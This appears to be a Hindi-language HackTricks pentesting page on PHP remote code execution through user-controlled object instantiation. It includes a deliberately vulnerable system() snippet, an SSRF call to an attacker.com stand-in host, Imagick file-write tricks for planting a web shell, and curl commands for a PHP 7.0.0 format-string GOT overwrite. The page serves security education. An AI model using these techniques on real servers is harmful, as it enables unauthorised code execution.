# PHP - RCE ऑब्जेक्ट निर्माण का दुरुपयोग: new $_GET["a"]($_GET["b"])

{{#include ../../../banners/hacktricks-training.md}}

यह मूलतः [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) का सारांश है

## परिचय

new arbitrary objects बनाने से, जैसे `new $_GET["a"]($_GET["a"])`, Remote Code Execution (RCE) हो सकता है, जैसा कि एक [**writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) में विस्तार से बताया गया है। यह दस्तावेज़ RCE हासिल करने की विभिन्न रणनीतियों को उजागर करता है।

## Custom Classes या Autoloading के माध्यम से RCE

सिंटैक्स `new $a($b)` का उपयोग एक object को instantiate करने के लिए किया जाता है जहाँ **`$a`** class name को दर्शाता है और **`$b`** constructor को दिया गया पहला argument है। ये variables user inputs जैसे GET/POST से आ सकते हैं, जहाँ वे strings या arrays हो सकते हैं, या JSON से आ सकते हैं जहाँ वे अन्य प्रकार के रूप में प्रस्तुत हो सकते हैं।

Consider the code snippet below:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
इस उदाहरण में, `$a` को `App` या `App2` और `$b` को एक सिस्टम कमांड (जैसे, `uname -a`) सेट करने पर वह कमांड निष्पादित हो जाती है।

**Autoloading functions** का दुरुपयोग तब किया जा सकता है जब ऐसे क्लासेज़ सीधे उपलब्ध न हों। ये फ़ंक्शन आवश्यकता पड़ने पर फाइलों से ऑटोमैटिक रूप से क्लासेज़ लोड करते हैं और इन्हें `spl_autoload_register` या `__autoload` का उपयोग करके परिभाषित किया जाता है:
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
Autoloading का व्यवहार PHP के संस्करणों के साथ बदलता है, जो अलग-अलग RCE संभावनाएँ प्रदान करता है।

## RCE via बिल्ट-इन क्लासेस

यदि custom classes या autoloaders मौजूद नहीं हैं, तो **बिल्ट-इन PHP क्लासेस** RCE के लिए पर्याप्त हो सकती हैं। इन क्लासेस की संख्या PHP के संस्करण और extensions के आधार पर लगभग 100 से 200 के बीच होती है। इन्हें `get_declared_classes()` के माध्यम से सूचीबद्ध किया जा सकता है।

रोचक constructors को reflection API के जरिए पहचाना जा सकता है, जैसा कि निम्नलिखित उदाहरण और लिंक [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF) में दिखाया गया है।

**विशेष तरीकों के माध्यम से RCE में शामिल हैं:**

### **SSRF + Phar Deserialization**

`SplFileObject` class अपने constructor के माध्यम से SSRF को सक्षम करता है, जिससे किसी भी URL से कनेक्शन की अनुमति मिलती है:
```php
new SplFileObject('http://attacker.com/');
```
SSRF, Phar प्रोटोकॉल का उपयोग करके, PHP के 8.0 से पहले के संस्करणों में deserialization attacks का कारण बन सकता है।

### **Exploiting PDOs**

PDO class constructor आपको DSN strings के माध्यम से databases से कनेक्ट करने की अनुमति देता है, जो संभावित रूप से file creation या अन्य interactions को सक्षम कर सकता है:
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

PHP के वे वर्शन 5.3.22 और 5.4.12 तक `SoapClient` और `SimpleXMLElement` कंस्ट्रक्टर्स के माध्यम से XXE अटैक्स के प्रति संवेदनशील थे, जो libxml2 के वर्शन पर निर्भर था।

## RCE via Imagick Extension

**प्रोजेक्ट की निर्भरताएँ** के विश्लेषण में पता चला कि **Imagick** नए ऑब्जेक्ट्स instantiate करके **command execution** के लिए इस्तेमाल किया जा सकता है। यह कमजोरियों का शोषण करने का अवसर देता है।

### VID parser

VID parser में फाइल सिस्टम के किसी भी निर्दिष्ट पाथ पर कंटेंट लिखने की क्षमता पाई गई थी। इससे वेब-एक्सेसिबल डायरेक्टरी में एक PHP shell रखने के द्वारा Remote Code Execution (RCE) हासिल किया जा सकता है।

#### VID Parser + File Upload

ध्यान दिया गया कि PHP अपलोड की गई फाइलों को अस्थायी रूप से `/tmp/phpXXXXXX` में स्टोर करता है। Imagick का VID parser **msl** प्रोटोकॉल का उपयोग करते हुए फाइल पाथ में wildcards को संभाल सकता है, जिससे अस्थायी फ़ाइल को चुने हुए लोकेशन पर ट्रांसफर करना संभव होता है। यह तरीका फाइल सिस्टम में arbitrary file writing प्राप्त करने का एक अतिरिक्त तरीका प्रदान करता है।

### PHP Crash + Brute Force

[**मूल लेख**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) में वर्णित एक विधि ऐसी फाइलें अपलोड करने पर आधारित है जो डिलीट होने से पहले सर्वर को क्रैश कर देती हैं। अस्थायी फाइल के नाम को brute-force करके, Imagick arbitrary PHP code को execute कर सकता है। हालांकि, यह तकनीक केवल ImageMagick के एक पुराने वर्शन में ही प्रभावी पाई गई थी।

## Format-string in class-name resolution (PHP 7.0.0 Bug #71105)

जब यूज़र इनपुट क्लास नाम को नियंत्रित करता है (उदा., `new $_GET['model']()`), PHP 7.0.0 में `Throwable` refactor के दौरान एक अस्थायी बग आया जहाँ इंजन क्लास नाम को resolution के दौरान गलती से printf format string की तरह ट्रीट करता था। इससे PHP के अंदर क्लासिक printf-style primitives सक्षम हुए: `%p` के साथ leak, width specifiers के साथ write-count कंट्रोल, और `%n` के साथ प्रोसेस में pointers (उदाहरण के लिए, GOT entries on ELF builds) पर arbitrary writes।

Minimal repro vulnerable pattern:
```php
<?php
$model = $_GET['model'];
$object = new $model();
```
शोषण रूपरेखा (संदर्भ से):
- class name में `%p` के माध्यम से Leak addresses करके एक writable target खोजें:
```bash
curl "http://host/index.php?model=%p-%p-%p"
# Fatal error includes resolved string with leaked pointers
```
- पोजिशनल पैरामीटर्स और width specifiers का उपयोग करके सटीक byte-count सेट करें, फिर `%n` से उस मान को stack पर पहुंचने वाले address पर लिखें; लक्ष्य एक GOT slot (e.g., `free`) बनाकर उसे आंशिक रूप से ओवरराइट कर `system` में बदलना।
- shell pipe वाले class name को पास करके हाइजैक्ड फ़ंक्शन को trigger करें ताकि `system("id")` पहुँच सके।

नोट्स:
- यह केवल PHP 7.0.0 पर काम करता है (Bug [#71105](https://bugs.php.net/bug.php?id=71105)); बाद की रिलीज़ में ठीक किया गया है। Severity: critical अगर arbitrary class instantiation मौजूद है।
- सामान्य payloads कई `%p` को chain करके stack को walkthrough करते हैं, फिर `%.<width>d%<pos>$n` का उपयोग आंशिक ओवरराइट के लिए करते हैं।

## संदर्भ

- https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/
- The Art of PHP: CTF‑born exploits and techniques

{{#include ../../../banners/hacktricks-training.md}}
